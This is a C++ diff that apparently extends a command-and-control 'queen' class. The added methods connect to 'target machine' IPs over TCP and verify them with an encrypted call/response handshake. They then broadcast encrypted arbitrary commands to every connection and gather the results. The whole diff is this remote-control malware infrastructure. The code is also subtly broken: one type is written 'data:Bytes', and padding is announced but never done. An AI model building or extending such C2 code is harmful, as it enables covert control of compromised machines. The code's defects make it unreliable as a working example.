@@ -45,24 +45,71 @@ namespace queen {
 
 		private:
 
-			key::Key voxKey;
+			key::Key k;
 			vox::VOX cipher;
 			data::Bytes c;
 			data::Bytes r;
 
 			sda::SDA<conn::TCPConnection> connections;
+			int nextConnectionIndex = 0;
 
 		public:
 
 			C2Queen(key::Key encryptionKey, data::Bytes call = defaultCall, data::Bytes response = defaultResponse, int n = 1000) {
-				voxKey = encryptionKey;
+				k = encryptionKey;
 				c = call;
 				r = response;
+				if (c.getLength() != 128) {
+					notif::warning("automatically padding call to be 128 bytes");
+				}
+				if (r.getLength() != 128) {
+					notif::warning("automatically padding response to be 128 bytes");
+				}
 				connections = sda::SDA<conn::TCPConnection>(n);
 			}
 
-			bool establishConnection(string ip, int port) {
-				
+			int getConnectionCount() { return nextConnectionIndex; }
+
+			void establishConnection(string ip, int port) {
+				connections.set(nextConnectionIndex, conn::TCPConnection(ip, port));
+				connections[nextConnectionIndex].establish();
+				data:Bytes callCiphertext = cipher.encrypt(c, k);
+				connections[nextConnectionIndex].transmit(callCiphertext);
+				data::Bytes response = connections[nextConnectionIndex].receive();
+				bool correct = false;
+				if (response.getLength() == 256) {
+					if (cipher.decrypt(response, k) == r) {
+						correct = true;
+					}
+				}
+				if (!correct) {
+					notif::security("target machine did not respond correctly", CAUTION);
+				}
+			}
+
+			void terminateConnections() {
+				for (int i = 0; i < getConnectionCount(); i++) {
+					connections.get(i).terminate();
+				}
+				nextConnectionIndex = 0;
+			}
+
+			data::Bytes strip(data::Bytes x) {
+				int n = 0;
+				for (int i = 0; x.get(i) != 0; i++) { n++; }
+				return x.subbytes(0, n);
+			}
+
+			sda::SDA<data::Bytes> transmitCommand(string cmd) {
+				data::Bytes cmdBytes(cmd);
+				for (int i = 0; i < getConnectionCount(); i++) {
+					connections[i].transmit(cipher.encrypt(cmdBytes, k));
+				}
+				sda::SDA<data::Bytes> results(getConnectionCount());
+				for (int i = 0; i < getConnectionCount(); i++) {
+					results.set(i, strip(cipher.decrypt(connections[i].receive(), k)));
+				}
+				return results;
 			}
 
 	};
